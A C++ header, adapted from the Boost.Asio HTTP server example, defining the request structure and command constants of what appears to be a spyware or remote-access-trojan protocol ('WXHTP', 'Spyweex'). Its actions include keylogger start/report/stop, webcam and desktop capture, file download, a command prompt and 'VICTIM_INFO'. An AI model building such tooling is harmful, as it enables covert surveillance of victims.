//
// request.hpp
// ~~~~~~~~~~~
//
// Copyright (c) 2003-2015 Christopher M. Kohlhoff (chris at kohlhoff dot com)
//
// Distributed under the Boost Software License, Version 1.0. (See accompanying
// file LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)
//

#ifndef HTTP_REQUEST_HPP
#define HTTP_REQUEST_HPP

#include <string>
#include <vector>
#include <map>
#include "header.hpp"

namespace http {
	namespace server {		
		/// A request received from a client.
		struct request
		{
		  std::string method;
		  std::string action_type;
		  int wxhtp_version_major;
		  int wxhtp_version_minor;
		  std::vector<header> headers;
		  std::map<std::string, std::string> dictionary_headers;
		  std::string content;

		  void clear_fields()
		  {
			  this->content.clear();
			  this->action_type.clear();
			  this->headers.clear();
			  this->dictionary_headers.clear();
			  this->method.clear();
			  this->wxhtp_version_major = 0;
			  this->wxhtp_version_minor = 0;
		  }

		  request()
		  {
			  
		  }

		  request(const request& req)
		  {
			  this->method = req.method;
			  this->action_type = req.action_type;
			  this->wxhtp_version_major = req.wxhtp_version_major;
			  this->wxhtp_version_minor = req.wxhtp_version_minor;
			  this->headers = req.headers;
			  this->dictionary_headers = req.dictionary_headers;
			  this->content = req.content;
		  }
		};

		namespace wxhtpconstants
		{
			namespace METHOD_TYPE
			{
				const char GET[] = "GET";
				const char POST[] = "POST";
			}

			namespace ACTION_TYPE
			{
				const char THUMBNAIL_SCREEN_START[] = "/ACTION=THUMBNAIL_SCREEN_START";
				const char THUMBNAIL_SCREEN_STOP[] = "/ACTION=THUMBNAIL_SCREEN_STOP";
				const char THUMBNAIL_SCREEN_REPORT[] = "/ACTION=THUMBNAIL_SCREEN_REPORT";
				const char TAKE_DESKTOP_SCREEN[] = "/ACTION=TAKE_DESKTOP_SCREEN";
				const char TAKE_WEBCAM_SCREEN[] = "/ACTION=TAKE_WEBCAM_SCREEN";
				const char KEYLOGGER_START[] = "/ACTION=KEYLOGGER_START";
				const char KEYLOGGER_REPORT[] = "/ACTION=KEYLOGGER_REPORT";
				const char KEYLOGGER_STOP[] = "/ACTION=KEYLOGGER_STOP";
				const char DOWNLOAD_FILE[] = "/ACTION=DOWNLOAD_FILE";
				const char COMMAND_PROMPT[] = "/ACTION=COMMAND_PROMPT";
				const char VICTIM_INFO[] = "/ACTION=VICTIM_INFO";
			}

			namespace HEADER_TYPES
			{
				const char HOST[] = "Host:";
				const char TAG[] = "Tag:";
				const char USER_AGENT[] = "User-Agent:";
				const char CONTENT_TYPE[] = "Content-type:";
				const char CONTENT_LENGTH[] = "Content-Length:";
			}

			namespace DELIMITITERS
			{
				const char DOUBLE_NEWLINE[] = "\r\n\r\n";
				const char NEWLINE[] = "\r\n";
				const char SPACE = ' ';
				const char DOUBLE_PERCENT[] = "%%";
			}

			namespace VERSION
			{
				const char SPY_VERSION[] = "WXHTP/1.1";
				const char STANDARD_AGENT[] = "Spyweex-client-sharp";
			}
		}
	} // namespace server
} // namespace http

#endif // HTTP_REQUEST_HPP